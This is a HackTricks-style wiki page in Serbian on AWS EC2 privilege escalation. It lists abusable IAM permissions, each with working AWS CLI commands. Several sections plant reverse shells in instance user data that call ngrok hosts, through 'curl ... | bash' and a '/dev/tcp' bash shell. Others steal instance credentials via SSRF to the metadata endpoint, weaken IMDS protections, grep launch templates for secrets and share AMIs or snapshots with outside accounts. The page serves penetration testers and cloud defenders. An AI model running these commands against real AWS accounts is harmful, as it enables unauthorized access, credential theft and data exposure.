# AWS - EC2 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## EC2

Za više **informacija o EC2** pogledajte:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

Napadač može **kreirati instancu kojoj dodeli IAM role i zatim pristupiti toj instanci** kako bi ukrao IAM role credentials sa metadata endpoint.

- **Pristup preko SSH**

Pokrenite novu instancu koristeći već **kreirani** **ssh key** (`--key-name`) i zatim se povežite na nju preko ssh (ako želite da kreirate novu možda će vam trebati dozvola `ec2:CreateKeyPair`).
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
- **Pristup preko rev shell u user data**

Možete pokrenuti novu instancu koristeći **user data** (`--user-data`) koja će vam poslati **rev shell**. Na ovaj način nije potrebno navoditi security group.
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
Budite oprezni sa GuradDuty ako koristite kredencijale IAM role van instance:

{{#ref}}
../../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md
{{#endref}}

**Potencijalni uticaj:** Direktan privesc na bilo koju EC2 rolu pridruženu postojećim instance profilima.

#### Privesc na ECS

Sa ovim skupom permisija takođe biste mogli **kreirati EC2 instance i registrovati je unutar ECS clustera**. Na ovaj način, ECS **servisi** će biti **pokrenuti** unutar **EC2 instance** kojoj imate pristup, i onda možete prodrijeti u te servise (docker kontejnere) i **ukrasti njihove prikačene ECS role**.
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
Da biste saznali kako da **naterate ECS servise da se pokrenu** u ovoj novoj EC2 instance, pogledajte:

{{#ref}}
../aws-ecs-privesc/README.md
{{#endref}}

Ako **ne možete kreirati novu instance** ali imate dozvolu `ecs:RegisterContainerInstance` možda ćete moći da registrujete instance unutar cluster i izvedete pomenuti attack.

**Potential Impact:** Direktan privesc na ECS roles prikačene na tasks.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

Slično prethodnom scenariju, attacker sa ovim dozvolama može **promeniti IAM role kompromitovane instance** tako da bi mogao da ukrade nove credentials.\
Pošto instance profile može imati samo 1 role, ako instance profile **već ima role** (uobičajen slučaj), takođe ćete trebati **`iam:RemoveRoleFromInstanceProfile`**.
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
Ako **instance profile ima role** i napadač **ne može da ga ukloni**, postoji drugo zaobilazno rešenje. Može da **pronađe** **instance profile bez role** ili **kreira novi** (`iam:CreateInstanceProfile`), **doda** **role** tom **instance profile** (kao što je ranije objašnjeno), i **poveže instance profile** kompromitovan sa kompromitovanom i**nstance:**

- Ako instance **ne poseduje nijedan instance** profile (`ec2:AssociateIamInstanceProfile`)
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
**Potencijalni uticaj:** Direktan privesc na drugi EC2 role (morate kompromitovati AWS EC2 instance i imati neke dodatne dozvole ili specifičan instance profile status).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

Sa ovim dozvolama moguće je promeniti instance profile koji je povezan sa instancom, tako da ako je napadač već imao pristup instanci, moći će da ukrade credentials za više instance profile roles promenom onog koji je povezan sa tom instancom.

- Ako instanca **ima instance profile**, možete **ukloniti** instance profile (`ec2:DisassociateIamInstanceProfile`) i **povezati** ga
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
- ili **zameniti** **instance profile** kompromitovane instance (`ec2:ReplaceIamInstanceProfileAssociation`).
```bash
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<value> --association-id <value>
```
**Potencijalni uticaj:** Direktan privesc na drugi EC2 role (potrebno je да сте kompromitovali AWS EC2 instancu i да imate neka dodatna dopuštenja ili specifičan instance profile status).

### `ec2:RequestSpotInstances`,`iam:PassRole`

Napadač koji ima dozvole **`ec2:RequestSpotInstances`and`iam:PassRole`** može **zatražiti** **Spot Instance** sa **EC2 Role attached** i sa **rev shell** u **user data**.\
Kada se instanca pokrene, on može **ukrasti IAM role**.
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
### `ec2:ModifyInstanceAttribute`

Napadač koji ima **`ec2:ModifyInstanceAttribute`** može da menja atribute instance. Između ostalog, može da **promeni user data**, što znači da može da natera instancu da **pokrene proizvoljne podatke.** To se može iskoristiti za dobijanje **rev shell** na EC2 instanci.

Napomena: atributi se mogu **menjati samo dok je instanca zaustavljena**, pa su potrebne **dozvole** **`ec2:StopInstances`** i **`ec2:StartInstances`**.
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**Potencijalni uticaj:** Direktan privesc do bilo koje EC2 IAM Role prikačene na kreiranu instancu.

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

Napadač koji ima dozvole **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`and `ec2:ModifyLaunchTemplate`** može da kreira **novu Launch Template verziju** sa **rev shell u** **user data** i **bilo kojom EC2 IAM Role na njoj**, promeni podrazumevanu verziju, i **bilo koja Autoscaler grupa** **koja koristi** taj **Launch Templat**e i koja je **konfigurisana** da koristi **najnoviju** ili **podrazumevanu verziju**, će **ponovo pokrenuti instance** koristeći taj template i izvršiti rev shell.
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
**Potencijalni uticaj:** Direktan privesc na drugi EC2 role.

### (`autoscaling:CreateLaunchConfiguration` | `ec2:CreateLaunchTemplate`),  `iam:PassRole`, (`autoscaling:CreateAutoScalingGroup` | `autoscaling:UpdateAutoScalingGroup`)

Napadač sa dozvolama **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** može da **kreira Launch Configuration** sa **IAM Role** i **rev shell** unutar **user data**, zatim **kreira autoscaling group** iz te Launch Configuration i sačeka da rev shell **preuzme IAM Role**.
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**Mogući uticaj:** Direktan privesc na drugu EC2 rolu.

### `!autoscaling`

Skup dozvola **`ec2:CreateLaunchTemplate`** i **`autoscaling:CreateAutoScalingGroup`** **nije dovoljan za eskalaciju** privilegija na IAM rolu jer, da biste prikačili rolu navedenu u Launch Configuration ili u Launch Template, potrebne su dozvole `iam:PassRole` i `ec2:RunInstances` (što je poznati privesc).

### `ec2-instance-connect:SendSSHPublicKey`

Napadač koji ima dozvolu **`ec2-instance-connect:SendSSHPublicKey`** može dodati ssh ključ korisniku i iskoristiti ga za pristup (ako ima ssh pristup instanci) ili za eskalaciju privilegija.
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**Potencijalni uticaj:** Direktan privesc do EC2 IAM roles prikačenih na pokrenutim instancama.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

Napadač sa dozvolom **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** može **dodati ssh ključ za serijski konzolni pristup**. Ako serijski konzolni pristup nije omogućen, napadač treba dozvolu **`ec2:EnableSerialConsoleAccess` da ga omogući**.

Da biste se povezali na serijski port, takođe **morate znati korisničko ime i lozinku korisnika** unutar mašine.
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
Ovaj način nije toliko koristan za privesc jer je potrebno znati username i password da bi se iskoristio.

**Mogući uticaj:** (Veoma teško dokazivo) Direct privesc to the EC2 IAM roles attached to running instances.

### `describe-launch-templates`,`describe-launch-template-versions`

Pošto launch templates imaju verzionisanje, napadač sa **`ec2:describe-launch-templates`** i **`ec2:describe-launch-template-versions`** permisijama može iskoristiti ovo da otkrije osetljive informacije, kao što su kredencijali koji se nalaze u user data. Da bi to postigao, sledeći skript prolazi kroz sve verzije dostupnih launch templates:
```bash
for i in $(aws ec2 describe-launch-templates --region us-east-1 | jq -r '.LaunchTemplates[].LaunchTemplateId')
do
echo "[*] Analyzing $i"
aws ec2 describe-launch-template-versions --launch-template-id $i --region us-east-1 | jq -r '.LaunchTemplateVersions[] | "\(.VersionNumber) \(.LaunchTemplateData.UserData)"' | while read version userdata
do
echo "VersionNumber: $version"
echo "$userdata" | base64 -d
echo
done | grep -iE "aws_|password|token|api"
done
```
U gore navedenim komandama, iako navodimo određene obrasce (`aws_|password|token|api`), možete koristiti drugačiji regex da tražite druge vrste osetljivih informacija.

Pretpostavljajući da nađemo `aws_access_key_id` i `aws_secret_access_key`, možemo koristiti te kredencijale za autentifikaciju na AWS.

**Potential Impact:** Direktna eskalacija privilegija na IAM korisnike.

## References

- [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)





### `ec2:ModifyInstanceMetadataOptions` (Smanjivanje IMDS zaštite kako bi se omogućila krađa kredencijala putem SSRF)

Napadač koji ima mogućnost da pozove `ec2:ModifyInstanceMetadataOptions` na ciljanoj EC2 instanci može oslabiti IMDS zaštite omogućavanjem IMDSv1 (`HttpTokens=optional`) i povećanjem `HttpPutResponseHopLimit`. To čini endpoint metapodataka instance dostupnim preko uobičajenih SSRF/proxy putanja iz aplikacija koje se izvršavaju na instanci. Ako napadač može pokrenuti SSRF u takvoj aplikaciji, može preuzeti kredencijale instance profila i pivotirati koristeći ih.

- Potrebna dopuštenja: `ec2:ModifyInstanceMetadataOptions` na ciljanoj instanci (pored mogućnosti da dosegne/pokrene SSRF na hostu).
- Ciljni resurs: pokrenuta EC2 instanca sa prikačenim instance profile-om (IAM role).

Commands example:
```bash
# 1) Check current metadata settings
aws ec2 describe-instances --instance-id <INSTANCE_ID> \
--query 'Reservations[0].Instances[0].MetadataOptions'

# 2) Downgrade IMDS protections (enable IMDSv1 and raise hop limit)
aws ec2 modify-instance-metadata-options --instance-id <INSTANCE_ID> \
--http-endpoint enabled --http-tokens optional \
--http-put-response-hop-limit 3 --instance-metadata-tags enabled

# 3) Through the SSRF, enumerate role name
curl "http://<VICTIM_PUBLIC_IP>:<APP_PORT>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 4) Through the SSRF, steal the temporary credentials
curl "http://<VICTIM_PUBLIC_IP>:<APP_PORT>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"

# 5) Use the stolen credentials
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
export AWS_SESSION_TOKEN=<Token>
aws sts get-caller-identity

# 6) Restore protections (require IMDSv2, low hop limit)
aws ec2 modify-instance-metadata-options --instance-id <INSTANCE_ID> \
--http-tokens required --http-put-response-hop-limit 1
```
Mogući uticaj: Krađa kredencijala instance profila putem SSRF-a što dovodi do eskalacije privilegija i lateralnog kretanja uz dozvole EC2 role.

### `ec2:ModifyInstanceMetadataOptions`

Napadač koji ima dozvolu ec2:ModifyInstanceMetadataOptions može oslabiti zaštite Instance Metadata Service (IMDS) — na primer forsiranjem IMDSv1 (činjenjem HttpTokens nepotrebnim) ili povećanjem HttpPutResponseHopLimit — čime se olakšava eksfiltracija privremenih kredencijala. Najrelevantniji vektor rizika je povećanje HttpPutResponseHopLimit: povećanjem tog hop limita (TTL), endpoint 169.254.169.254 prestaje biti strogo ograničen na mrežni namespace VM-a i može postati dostupan drugim procesima/kontejnerima, omogućavajući krađu kredencijala.
```bash
aws ec2 modify-instance-metadata-options \
--instance-id <INSTANCE_ID> \
--http-tokens optional \
--http-endpoint enabled \
--http-put-response-hop-limit 2
```
### `ec2:ModifyImageAttribute`, `ec2:ModifySnapshotAttribute`

Napadač koji ima dozvole `ec2:ModifyImageAttribute` i `ec2:ModifySnapshotAttribute` može da podeli AMIs ili snapshots sa drugim AWS nalozima (ili čak da ih učini javnim), čime izlaže images ili volumes koji mogu sadržati osetljive podatke kao što su konfiguracije, pristupni podaci, sertifikati ili rezervne kopije. Menjanjem AMI-jeve launch permissions ili snapshot-ovih create-volume permissions, napadač omogućava trećim stranama da pokrenu instances ili montiraju diskove iz tih resursa i pristupe njihovom sadržaju.

Da biste podelili AMI sa drugim nalogom:
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
Da biste podelili EBS snapshot sa drugim nalogom:
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{{#include ../../../../banners/hacktricks-training.md}}
